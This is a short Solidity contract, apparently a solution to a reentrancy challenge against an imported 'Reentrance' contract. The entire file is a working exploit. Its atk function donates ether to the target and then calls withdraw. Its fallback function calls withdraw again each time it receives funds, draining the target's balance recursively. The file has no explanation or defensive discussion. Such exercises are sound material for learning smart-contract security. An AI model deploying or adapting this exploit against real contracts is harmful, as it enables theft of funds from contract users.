pragma solidity 0.6.5;
import "../Reentrance.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract ReentrancyExploit{
    Reentrance public instance;
    uint amonut;

    constructor(address payable _instance) public {
        instance = Reentrance(_instance);
    }
    function atk() public payable{
        amonut = msg.value;
    // call donate to have an existing balance
        instance.donate{value:amonut}(address(this)); 
    // initiate withdraw by which reentrancy as well is intiated
        instance.withdraw(amonut);
    }

    fallback() external payable{
        instance.withdraw(amonut);
    }
}